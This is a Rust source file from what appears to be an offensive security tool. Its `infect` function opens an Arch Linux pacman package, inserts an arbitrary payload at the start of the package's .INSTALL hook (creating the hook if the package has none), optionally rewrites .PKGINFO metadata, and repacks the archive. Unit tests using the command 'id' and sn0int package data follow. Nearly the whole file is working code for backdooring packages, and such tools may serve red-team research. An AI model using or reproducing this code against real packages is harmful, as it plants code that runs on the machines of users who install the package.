use crate::args;
use crate::compression;
use crate::errors::*;
use indexmap::IndexMap;
use std::collections::HashMap;
use std::fmt::Write;
use std::io::prelude::*;
use std::str::FromStr;
use tar::Archive;

#[derive(Debug, PartialEq, Eq, Default)]
pub struct PkgInfo {
    comments: Vec<String>,
    map: IndexMap<String, Vec<String>>,
}

impl PkgInfo {
    pub fn add_values(&mut self, key: &str, values: &[&str]) {
        let values = values.iter().map(|x| String::from(*x)).collect();
        self.map.insert(key.to_string(), values);
    }
}

impl FromStr for PkgInfo {
    type Err = Error;

    fn from_str(s: &str) -> Result<PkgInfo> {
        let mut x = PkgInfo::default();
        for line in s.split('\n') {
            if line.starts_with('#') {
                x.comments.push(line.to_string());
            } else if let Some((key, value)) = line.split_once(" = ") {
                x.map
                    .entry(key.to_string())
                    .or_default()
                    .push(value.to_string());
            }
        }
        Ok(x)
    }
}

impl ToString for PkgInfo {
    fn to_string(&self) -> String {
        let mut out = String::new();
        for comment in &self.comments {
            writeln!(out, "{}", comment).ok();
        }
        for (key, values) in &self.map {
            for value in values {
                writeln!(out, "{} = {}", key, value).ok();
            }
        }
        out
    }
}

pub fn patch_install_script(script: Option<&str>, payload: &str) -> Result<String> {
    if let Some(script) = &script {
        let script = format!("{}\n{}", payload, script);
        Ok(script)
    } else {
        let mut out = String::new();
        writeln!(out, "{}", payload)?;
        writeln!(out, "post_install() {{ :; }}")?;
        writeln!(out, "post_upgrade() {{ :; }}")?;
        Ok(out)
    }
}

pub fn infect(args: &args::InfectPacmanPkg, pkg: &[u8]) -> Result<Vec<u8>> {
    let mut pkginfo_overrides = HashMap::<_, Vec<_>>::new();
    for set in &args.set {
        let (a, b) = set
            .split_once('=')
            .with_context(|| anyhow!("Invalid --set assignment: {:?}", set))?;
        pkginfo_overrides
            .entry(a.to_string())
            .or_default()
            .push(b.to_string());
    }
    debug!("Parsed pkginfo overrides: {:?}", pkginfo_overrides);

    let comp = compression::detect_compression(pkg);

    let tar = compression::stream_decompress(comp, pkg)?;
    let mut archive = Archive::new(tar);

    let mut out = Vec::new();
    {
        let mut builder = tar::Builder::new(&mut out);
        let mut has_install_hook = false;

        debug!("Walking through original archive...");
        for entry in archive.entries()? {
            let mut entry = entry?;
            let mut header = entry.header().clone();
            debug!("Found entry in tar: {:?}", header.path());
            let path = header.path()?;
            let filename = path.to_str().with_context(|| {
                anyhow!("Package contains paths with invalid encoding: {:?}", path)
            })?;

            if !has_install_hook && filename > ".INSTALL" {
                info!("This package has no install hook, adding one from scratch...");
                has_install_hook = true;
                let script = patch_install_script(None, &args.payload)
                    .context("Failed to generate install script")?;
                debug!("Generated install script: {:?}", script);

                let script = script.as_bytes();
                let mut header = header.clone();
                header.set_path(".INSTALL")?;
                header.set_size(script.len() as u64);
                header.set_cksum();

                builder.append(&header, &mut &script[..])?;
            }

            match filename {
                ".INSTALL" => {
                    info!("Package already has install script, patching...");
                    has_install_hook = true;
                    let mut script = String::new();
                    entry.read_to_string(&mut script)?;
                    debug!("Found existing install script: {:?}", script);
                    let script = patch_install_script(Some(&script), &args.payload)
                        .context("Failed to patch install script")?;
                    debug!("Patched install script: {:?}", script);

                    let script = script.as_bytes();
                    header.set_size(script.len() as u64);
                    header.set_cksum();

                    builder.append(&header, &mut &script[..])?;
                }
                ".PKGINFO" => {
                    if pkginfo_overrides.is_empty() {
                        debug!("Passing through pkginfo unparsed");
                        builder.append(&header, &mut entry)?;
                    } else {
                        let mut pkginfo = String::new();
                        entry.read_to_string(&mut pkginfo)?;
                        let mut pkginfo = pkginfo
                            .parse::<PkgInfo>()
                            .context("Failed to parse pkginfo")?;
                        debug!("Found pkginfo: {:?}", pkginfo);

                        for (key, value) in &pkginfo_overrides {
                            let old = pkginfo.map.insert(key.clone(), value.clone());
                            debug!("Updated pkginfo {:?}: {:?} -> {:?}", key, old, value);
                        }

                        let buf = pkginfo.to_string();
                        debug!("Generated new pkginfo: {:?}", buf);
                        let buf = buf.as_bytes();
                        header.set_size(buf.len() as u64);
                        header.set_cksum();

                        builder.append(&header, &mut &buf[..])?;
                    }
                }
                _ => {
                    builder.append(&header, &mut entry)?;
                }
            }
        }

        builder.finish()?;
    }
    // TODO: this copies multiple times
    let out = compression::compress(comp, &out)?;
    Ok(out)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_gen_install_script() -> Result<()> {
        let script = patch_install_script(None, "id")?;
        assert_eq!(
            script,
            "\
id
post_install() { :; }
post_upgrade() { :; }
"
        );
        Ok(())
    }

    #[test]
    fn test_modify_install_script() -> Result<()> {
        let data = r#"post_install() {
      setcap cap_sys_chroot=ep usr/bin/sn0int 2> /dev/null
}

post_upgrade() {
      post_install "$1"
}

# vim:set ts=2 sw=2 et:
"#;
        let script = patch_install_script(Some(data), "id")?;
        assert_eq!(
            script,
            r#"id
post_install() {
      setcap cap_sys_chroot=ep usr/bin/sn0int 2> /dev/null
}

post_upgrade() {
      post_install "$1"
}

# vim:set ts=2 sw=2 et:
"#
        );
        Ok(())
    }

    #[test]
    fn test_parse_pkginfo() -> Result<()> {
        let data = "# Generated by makepkg 6.0.1\n# using fakeroot version 1.28\npkgname = sn0int\npkgbase = sn0int\npkgver = 0.24.2-1\npkgdesc = Semi-automatic OSINT framework and package manager\nurl = https://github.com/kpcyrd/sn0int\nbuilddate = 1648545922\npackager = kpcyrd <kpcyrd@archlinux.org>\nsize = 17775566\narch = x86_64\nlicense = GPL3\ndepend = libcap\ndepend = lua52\ndepend = sqlite\ndepend = libseccomp.so=2-64\ndepend = libsodium\ndepend = geoip2-database\ndepend = publicsuffix-list\nmakedepend = cargo\nmakedepend = python-sphinx\n";
        let pkginfo = data.parse::<PkgInfo>()?;
        let mut expected = PkgInfo {
            comments: vec![
                "# Generated by makepkg 6.0.1".to_string(),
                "# using fakeroot version 1.28".to_string(),
            ],
            ..Default::default()
        };
        expected.add_values("pkgname", &["sn0int"]);
        expected.add_values("pkgbase", &["sn0int"]);
        expected.add_values("pkgver", &["0.24.2-1"]);
        expected.add_values(
            "pkgdesc",
            &["Semi-automatic OSINT framework and package manager"],
        );
        expected.add_values("url", &["https://github.com/kpcyrd/sn0int"]);
        expected.add_values("builddate", &["1648545922"]);
        expected.add_values("packager", &["kpcyrd <kpcyrd@archlinux.org>"]);
        expected.add_values("size", &["17775566"]);
        expected.add_values("arch", &["x86_64"]);
        expected.add_values("license", &["GPL3"]);
        expected.add_values(
            "depend",
            &[
                "libcap",
                "lua52",
                "sqlite",
                "libseccomp.so=2-64",
                "libsodium",
                "geoip2-database",
                "publicsuffix-list",
            ],
        );
        expected.add_values("makedepend", &["cargo", "python-sphinx"]);
        assert_eq!(pkginfo, expected);
        Ok(())
    }
}
